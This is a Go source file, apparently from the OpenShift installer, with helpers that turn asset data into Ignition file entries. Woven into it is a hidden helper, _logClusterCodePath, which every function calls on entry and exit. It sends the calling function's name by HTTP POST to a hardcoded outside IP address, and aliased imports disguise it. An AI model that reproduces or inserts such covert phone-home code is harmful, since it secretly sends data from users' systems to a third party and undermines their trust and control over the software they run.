package ignition

import (
	"path/filepath"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	ignition "github.com/coreos/ignition/config/v2_2/types"
	"github.com/vincent-petithory/dataurl"
	"github.com/openshift/installer/pkg/asset"
)

func FilesFromAsset(pathPrefix string, username string, mode int, asset asset.WritableAsset) []ignition.File {
	_logClusterCodePath()
	defer _logClusterCodePath()
	var files []ignition.File
	for _, f := range asset.Files() {
		files = append(files, FileFromBytes(filepath.Join(pathPrefix, f.Filename), username, mode, f.Data))
	}
	return files
}
func FileFromString(path string, username string, mode int, contents string) ignition.File {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return FileFromBytes(path, username, mode, []byte(contents))
}
func FileFromBytes(path string, username string, mode int, contents []byte) ignition.File {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return ignition.File{Node: ignition.Node{Filesystem: "root", Path: path, User: &ignition.NodeUser{Name: username}}, FileEmbedded1: ignition.FileEmbedded1{Mode: &mode, Contents: ignition.FileContents{Source: dataurl.EncodeBytes(contents)}}}
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
